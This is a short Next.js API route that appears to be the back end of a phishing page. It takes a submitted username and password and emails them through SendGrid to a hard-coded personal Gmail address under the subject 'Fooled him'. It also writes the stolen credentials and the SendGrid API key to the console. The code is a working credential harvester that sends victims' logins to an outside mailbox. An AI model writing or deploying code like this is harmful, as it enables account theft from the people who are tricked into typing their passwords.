// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'
import sgMail from '@sendgrid/mail'

type Data = {
  name: string
}

const sgKey = process.env.SENDGRID_API_KEY || ''
sgMail.setApiKey(sgKey)

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>,
) {
  const { userName, password } = req.body
  console.log(process.env.SENDGRID_API_KEY)
  const msg = {
    to: 'mkluften93@gmail.com', // Change to your recipient
    from: 'mkluften93@gmail.com', // Change to your verified sender
    subject: 'Fooled him',
    text: `${userName} ${password}`,
    html: `Username: ${userName}, Password: ${password}`,
  }

  if (userName && password) {
    console.log(userName, password)
  }

  sgMail
    .send(msg)
    .then(() => {
      console.log('Email sent')
    })
    .catch((error) => {
      console.error(JSON.stringify(error))
    })

  res.status(200).json({ name: 'John Doe' })
  console.log('HEY')
}
